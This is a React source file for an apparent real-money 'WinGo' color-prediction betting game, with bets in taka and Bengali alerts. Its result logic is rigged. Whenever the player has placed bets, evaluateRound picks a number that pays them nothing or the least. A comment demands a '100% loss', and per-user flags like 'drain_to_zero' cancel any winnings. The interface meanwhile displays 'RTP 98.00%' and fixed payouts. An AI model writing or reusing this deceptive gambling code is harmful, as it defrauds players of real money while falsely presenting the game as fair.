import React, { useState, useEffect } from 'react';
import { useGame } from '../context/GameContext';
import { soundManager } from '../lib/audio';
import confetti from 'canvas-confetti';
import { 
  ChevronLeft, 
  Volume2, 
  VolumeX, 
  Sparkles, 
  Clock, 
  ShieldCheck, 
  RotateCw,
  Trophy,
  History
} from 'lucide-react';

export default function UniversalColorCasinoEngine({ gameId = 'wingo', onClose }) {
  const { user, adjustUserBalance, recordGameHistory, getGameEffectiveSettings } = useGame();
  const [mode, setMode] = useState('30s'); // '30s' | '1m' | '3m'
  const [countdown, setCountdown] = useState(30);
  const [period, setPeriod] = useState(() => `${new Date().getFullYear()}${String(Date.now()).slice(-8)}`);
  const [selectedBet, setSelectedBet] = useState(null); // 'green' | 'violet' | 'red' | 'big' | 'small' | 0-9
  const [betAmount, setBetAmount] = useState(20);
  const [activeBets, setActiveBets] = useState([]);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [history, setHistory] = useState([
    { period: '2026110201', num: 7, color: 'green', size: 'Big' },
    { period: '2026110202', num: 2, color: 'red', size: 'Small' },
    { period: '2026110203', num: 0, color: 'violet', size: 'Small' },
    { period: '2026110204', num: 8, color: 'red', size: 'Big' },
    { period: '2026110205', num: 5, color: 'violet', size: 'Big' }
  ]);
  const [lastWin, setLastWin] = useState(null);

  const isLocked = countdown <= 5;
  const betPresets = [10, 20, 50, 100, 200, 500];

  // Countdown timer loop
  useEffect(() => {
    const roundSecs = mode === '30s' ? 30 : mode === '1m' ? 60 : 180;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          evaluateRound();
          return roundSecs;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [mode, activeBets]);

  function evaluateRound() {
    const isTargetedLoss = 
      user?.force_result === 'force_lose' ||
      user?.force_mode === 'force_loss' ||
      user?.force_mode === 'drain_to_zero' ||
      user?.luck_mode === 'drain' ||
      Number(user?.custom_win_rate) === 0 ||
      Number(user?.custom_rtp) === 0 ||
      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));

    let winningNum = 0;

    // 🎯 USER MANDATE: When user bets, result MUST come out OPPOSITE to force 100% loss!
    if (activeBets.length > 0) {
      const candidateScores = [];

      for (let cand = 0; cand <= 9; cand++) {
        let candColor = 'green';
        if (cand === 0 || cand === 5) candColor = 'violet';
        else if ([2, 4, 6, 8].includes(cand)) candColor = 'red';
        else candColor = 'green';
        const candSize = cand >= 5 ? 'Big' : 'Small';

        let candPayout = 0;
        activeBets.forEach(b => {
          let won = false;
          let mult = 2.0;
          if (b.type === 'color') {
            if (b.val === candColor) {
              won = true;
              mult = candColor === 'violet' ? 4.5 : 2.0;
            } else if (candColor === 'violet' && (b.val === 'green' || b.val === 'red')) {
              won = true;
              mult = 1.5;
            }
          } else if (b.type === 'size') {
            if (b.val === candSize) {
              won = true;
              mult = 2.0;
            }
          } else if (b.type === 'num') {
            if (Number(b.val) === cand) {
              won = true;
              mult = 9.0;
            }
          }
          if (won) candPayout += b.amount * mult;
        });

        candidateScores.push({ num: cand, payout: candPayout });
      }

      // Filter numbers where user wins 0
      const zeroPayouts = candidateScores.filter(c => c.payout === 0);
      if (zeroPayouts.length > 0) {
        winningNum = zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)].num;
      } else {
        candidateScores.sort((a, b) => a.payout - b.payout);
        winningNum = candidateScores[0].num;
      }
    } else {
      // Natural pattern when user does NOT bet
      winningNum = Math.floor(Math.random() * 10);
    }

    let winColor = 'green';
    if (winningNum === 0 || winningNum === 5) winColor = 'violet';
    else if ([2, 4, 6, 8].includes(winningNum)) winColor = 'red';
    else winColor = 'green';

    const winSize = winningNum >= 5 ? 'Big' : 'Small';
    const newResult = {
      period: `${new Date().getFullYear()}${String(Date.now()).slice(-8)}`,
      num: winningNum,
      color: winColor,
      size: winSize
    };

    setHistory(prev => [newResult, ...prev.slice(0, 9)]);
    setPeriod(`${new Date().getFullYear()}${String(Date.now() + 1000).slice(-8)}`);

    // Evaluate user bets
    let totalPayout = 0;
    const totalBetAmount = activeBets.reduce((acc, b) => acc + (b.amount || 0), 0);

    activeBets.forEach(b => {
      let won = false;
      let mult = 2.0;

      if (!isTargetedLoss) {
        if (b.type === 'color') {
          if (b.val === winColor) {
            won = true;
            mult = winColor === 'violet' ? 4.5 : 2.0;
          } else if (winColor === 'violet' && (b.val === 'green' || b.val === 'red')) {
            won = true;
            mult = 1.5;
          }
        } else if (b.type === 'size') {
          if (b.val === winSize) {
            won = true;
            mult = 2.0;
          }
        } else if (b.type === 'num') {
          if (Number(b.val) === winningNum) {
            won = true;
            mult = 9.0;
          }
        }
      }

      if (won) {
        totalPayout += b.amount * mult;
      }
    });

    if (activeBets.length > 0 && recordGameHistory) {
      recordGameHistory({
        game: 'WinGo Casino',
        gameName: 'WinGo Casino',
        bet: totalBetAmount,
        amount: totalBetAmount,
        win: totalPayout,
        payout: totalPayout,
        mult: totalPayout > 0 ? (totalPayout / Math.max(1, totalBetAmount)).toFixed(2) + 'x' : '0.00x',
        betOption: totalPayout > 0 ? `Win ৳${totalPayout}` : 'Lost Bet'
      });
    }

    if (totalPayout > 0) {
      adjustUserBalance(user.uid, totalPayout);
      setLastWin({ payout: totalPayout, num: winningNum, color: winColor });
      if (soundEnabled) {
        try { soundManager.playWin(); } catch (e) {}
      }
      confetti({ particleCount: 70, spread: 60, origin: { y: 0.6 } });
    }

    setActiveBets([]);
  }

  function handlePlaceBet(type, val) {
    if (isLocked) {
      alert("শেষ ৫ সেকেন্ড বেটিং বন্ধ থাকে! পরবর্তী রাউন্ডের জন্য অপেক্ষা করুন।");
      return;
    }
    if (user.balance < betAmount) {
      alert("পর্যাপ্ত ব্যালেন্স নেই! দয়া করে ডিপোজিট করুন।");
      return;
    }

    adjustUserBalance(user.uid, -betAmount);
    if (soundEnabled) {
      try { soundManager.playBet(); } catch (e) {}
    }

    setActiveBets(prev => [...prev, { type, val, amount: betAmount }]);
  }

  return (
    <div className="fixed inset-0 z-50 bg-[#0e1626] text-white flex flex-col justify-between max-w-md mx-auto shadow-2xl overflow-hidden select-none font-sans">
      
      {/* 1. Header */}
      <div className="bg-gradient-to-r from-emerald-950 via-slate-900 to-emerald-900 border-b border-emerald-800/60 px-3.5 py-2.5 flex items-center justify-between shadow-md shrink-0">
        <div className="flex items-center space-x-2">
          <button 
            onClick={onClose}
            className="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center transition active:scale-95 cursor-pointer"
          >
            <ChevronLeft className="w-5 h-5 text-yellow-300" />
          </button>
          <div>
            <div className="flex items-center space-x-1.5">
              <span className="font-black text-sm tracking-wider text-yellow-300">
                {gameId === 'trxwingo' ? 'TRX WIN GO' : '91 CLUB WIN GO'}
              </span>
              <span className="bg-emerald-600 text-[8px] font-black px-1.5 py-0.2 rounded text-white tracking-widest uppercase">
                COLOR PREDICTION
              </span>
            </div>
            <span className="text-[9px] text-slate-400 font-mono">
              RTP 98.00% • 9X NUMBER PAYOUT
            </span>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <div className="bg-slate-950 border border-yellow-500/40 rounded-full px-2.5 py-1 flex items-center space-x-1.5 shadow-inner">
            <span className="text-[11px] font-black text-yellow-400 font-mono">
              ৳{user.balance.toFixed(2)}
            </span>
          </div>
          <button 
            onClick={() => setSoundEnabled(!soundEnabled)}
            className="text-slate-400 hover:text-white"
          >
            {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
          </button>
        </div>
      </div>

      {/* 2. Main Arena */}
      <div className="flex-1 flex flex-col p-3 overflow-y-auto no-scrollbar relative space-y-3">
        
        {/* Timer Banner */}
        <div className="bg-gradient-to-r from-emerald-900 via-teal-900 to-slate-900 border border-emerald-500/40 rounded-3xl p-3 shadow-lg flex items-center justify-between">
          <div>
            <div className="flex space-x-1 mb-1">
              {['30s', '1m', '3m'].map(m => (
                <button
                  key={m}
                  onClick={() => setMode(m)}
                  className={`px-2.5 py-0.5 rounded-full text-[10px] font-black transition ${
                    mode === m ? 'bg-yellow-400 text-slate-950 shadow-sm' : 'bg-slate-950/60 text-slate-400'
                  }`}
                >
                  WinGo {m}
                </button>
              ))}
            </div>
            <span className="text-[10px] text-slate-300 font-mono block">Period: {period}</span>
          </div>

          <div className="flex flex-col items-end">
            <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Time Remaining</span>
            <div className={`text-2xl font-mono font-black ${isLocked ? 'text-rose-500 animate-pulse' : 'text-yellow-400'}`}>
              00:{countdown < 10 ? `0${countdown}` : countdown}
            </div>
          </div>
        </div>

        {/* Lock Alert Indicator */}
        {isLocked && (
          <div className="bg-rose-950/90 border border-rose-500/60 text-rose-300 py-1.5 px-3 rounded-2xl text-center text-xs font-black animate-pulse">
            🔒 শেষ ৫ সেকেন্ড বেটিং লক! ফলাফল প্রকাশিত হচ্ছে...
          </div>
        )}

        {/* Win Alert */}
        {lastWin && (
          <div className="bg-emerald-950/90 border border-emerald-500 text-emerald-300 py-2 px-3 rounded-2xl text-center text-xs font-black animate-fade-in flex items-center justify-between">
            <span>🎉 ROUND RESULT: {lastWin.num} ({lastWin.color.toUpperCase()})</span>
            <span className="text-yellow-400 font-mono">+৳{lastWin.payout.toFixed(2)}</span>
          </div>
        )}

        {/* Color Prediction Buttons (Green, Violet, Red) */}
        <div className="grid grid-cols-3 gap-2">
          <button
            onClick={() => handlePlaceBet('color', 'green')}
            disabled={isLocked}
            className="bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white font-black py-3 rounded-2xl shadow-md transition disabled:opacity-50 text-xs flex flex-col items-center"
          >
            <span>GREEN</span>
            <span className="text-[9px] opacity-80">2X Payout</span>
          </button>

          <button
            onClick={() => handlePlaceBet('color', 'violet')}
            disabled={isLocked}
            className="bg-purple-600 hover:bg-purple-500 active:scale-95 text-white font-black py-3 rounded-2xl shadow-md transition disabled:opacity-50 text-xs flex flex-col items-center"
          >
            <span>VIOLET</span>
            <span className="text-[9px] opacity-80">4.5X Payout</span>
          </button>

          <button
            onClick={() => handlePlaceBet('color', 'red')}
            disabled={isLocked}
            className="bg-rose-600 hover:bg-rose-500 active:scale-95 text-white font-black py-3 rounded-2xl shadow-md transition disabled:opacity-50 text-xs flex flex-col items-center"
          >
            <span>RED</span>
            <span className="text-[9px] opacity-80">2X Payout</span>
          </button>
        </div>

        {/* Numbers 0 to 9 Grid (9X Multiplier) */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-3xl p-3 space-y-1.5">
          <div className="flex justify-between items-center text-[10px] text-slate-400 font-bold px-1">
            <span>CHOOSE NUMBER (9X PAYOUT):</span>
            <span className="text-yellow-400 font-mono">9.0X MULT</span>
          </div>
          <div className="grid grid-cols-5 gap-2">
            {[0, 1, 2, 3, 4, 5, 6, 7, 8, 9].map(num => {
              let bg = 'bg-emerald-600';
              if (num === 0 || num === 5) bg = 'bg-gradient-to-r from-rose-500 to-purple-600';
              else if ([2, 4, 6, 8].includes(num)) bg = 'bg-rose-600';
              return (
                <button
                  key={num}
                  onClick={() => handlePlaceBet('num', num)}
                  disabled={isLocked}
                  className={`${bg} hover:opacity-90 active:scale-95 text-white font-black py-2.5 rounded-2xl shadow text-sm font-mono transition disabled:opacity-50`}
                >
                  {num}
                </button>
              );
            })}
          </div>
        </div>

        {/* Big / Small Buttons */}
        <div className="grid grid-cols-2 gap-2">
          <button
            onClick={() => handlePlaceBet('size', 'Big')}
            disabled={isLocked}
            className="bg-amber-600 hover:bg-amber-500 active:scale-95 text-white font-black py-2.5 rounded-2xl shadow-md text-xs transition disabled:opacity-50"
          >
            BIG (5-9) 2X
          </button>
          <button
            onClick={() => handlePlaceBet('size', 'Small')}
            disabled={isLocked}
            className="bg-sky-600 hover:bg-sky-500 active:scale-95 text-white font-black py-2.5 rounded-2xl shadow-md text-xs transition disabled:opacity-50"
          >
            SMALL (0-4) 2X
          </button>
        </div>

        {/* Round History Balls */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-2.5 space-y-1">
          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-wider block">Game History</span>
          <div className="flex space-x-2 overflow-x-auto no-scrollbar">
            {history.map((h, i) => (
              <div key={i} className="flex flex-col items-center shrink-0">
                <div className={`w-7 h-7 rounded-full flex items-center justify-center font-mono font-black text-xs shadow-md ${
                  h.color === 'violet' ? 'bg-purple-600' : h.color === 'red' ? 'bg-rose-600' : 'bg-emerald-600'
                }`}>
                  {h.num}
                </div>
                <span className="text-[8px] text-slate-400 mt-0.5">{h.size}</span>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* 3. Bottom Controls */}
      <div className="bg-slate-950/95 border-t border-slate-800 p-3 space-y-2.5 shrink-0">
        
        <div className="flex items-center justify-between">
          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-wider">
            BET AMOUNT
          </span>
          <div className="flex space-x-1">
            {betPresets.map(preset => (
              <button
                key={preset}
                onClick={() => setBetAmount(preset)}
                className={`px-2.5 py-1 rounded-lg text-xs font-black font-mono transition ${
                  betAmount === preset 
                    ? 'bg-yellow-400 text-slate-950 shadow-sm' 
                    : 'bg-slate-900 text-slate-300 hover:bg-slate-800'
                }`}
              >
                ৳{preset}
              </button>
            ))}
          </div>
        </div>

        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-2 text-center text-xs text-slate-300 font-bold">
          Active Bets in Current Round: <strong className="text-yellow-400 font-mono">{activeBets.length}</strong> (৳{activeBets.reduce((a, b) => a + b.amount, 0)})
        </div>

      </div>

    </div>
  );
}

